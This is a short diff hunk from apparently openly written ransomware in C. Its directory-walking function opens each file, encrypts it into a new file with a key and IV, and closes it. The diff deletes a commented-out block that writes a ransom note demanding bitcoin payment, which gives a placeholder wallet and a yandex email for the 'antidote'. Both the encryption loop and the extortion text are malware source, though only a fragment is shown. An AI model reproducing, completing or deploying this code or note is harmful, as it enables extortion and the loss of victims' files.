@@ -83,16 +83,6 @@ void ls_dir(char* start_path)
                         fpin=fopen(full_path,"rb");
                         fpout=fopen(new_name,"wb");
                         
-                        //ONLY ONE RANSOMWARE_INFO
-                        //printf("%zu", strlen(start_path));  //35
-                        /*
-                         if (strlen(start_path)==35){
-                         fpreadme=fopen(full_path_readme,"w");
-                         fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
-                         fclose(fpreadme);
-                         }
-                         */
-                        
                         encryptfile(fpin,fpout,key,iv);
                         
                         fclose(fpin);
